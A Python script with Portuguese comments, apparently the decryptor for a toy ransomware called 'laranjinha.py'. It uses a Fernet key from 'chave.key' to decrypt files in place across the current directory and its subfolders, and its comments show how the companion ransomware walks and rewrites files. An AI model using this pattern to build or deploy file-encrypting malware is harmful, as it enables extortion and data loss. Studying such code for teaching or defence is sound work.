# Importando bibliotecas necessárias
import os
from cryptography.fernet import Fernet

# Criando lista para armazenar os nomes dos arquivos a serem desencriptados
arquivos = []

# Criando lista para armazenar os nomes das pastas encontradas
pastas = []

# Lendo a chave Fernet no arquivo chave.key
with open('chave.key', 'rb') as chave:
    chave_secreta = chave.read()

# Definindo a função principal
def main():
    # Para cada arquivo no diretório atual
    for arquivo in os.listdir():

        # Se o arquivo for 'laranjinha.py' (nosso ransomware)
        # Ou 'chave.key' (nossa chave de encriptação/decriptação)
        # Ou 'desencriptador.py' (nosso arquivo desencriptador)
        # Pular a iteração, não queremos encriptar eles :P
        if arquivo == 'laranjinha.py' or arquivo == 'chave.key' or arquivo == 'desencriptador.py':
            continue

        # Se o arquivo for de fato um arquivo adicione a lista 'arquivos'
        # Isso garante que não sejam adicionadas pastas por engano
        if os.path.isfile(arquivo):
            arquivos.append(arquivo)

        # Se o arquivo for uma pasta, pegue o caminho absoluto do arquivo
        # E então adicione-o a lista de pastas
        if os.path.isdir(arquivo):
            caminho_pasta = os.path.abspath(arquivo)
            pastas.append(caminho_pasta)
        
        # Desencriptando os arquivos da lista

    # Para cada arquivo em nossa lista 'arquivos'
    for arquivo in arquivos:

        # Lê seu conteúdo e o armazena na variável 'conteudo'
        with open(arquivo, 'rb') as arquivo_atual:
            conteudo = arquivo_atual.read()

            # Desencripta o conteúdo e o guarda na variavel 'conteudo_desencriptado'
            conteudo_desencriptado = Fernet(chave_secreta).decrypt(conteudo)

        # Reescreve o conteúdo desencriptado no arquivo
        with open(arquivo, 'wb') as arquivo_atual:
            arquivo_atual.write(conteudo_desencriptado)

    # Limpando a lista de arquivos para não ocorrer erros
    # Ao tentar abrir um arquivo pertencente a outra pasta
    arquivos.clear()

# Chamando a função main()
main()

# Iterarndo sobre cada pasta encontrada e adicionando seus arquivos a lista
for pasta in pastas:
    os.chdir(pasta)
    main()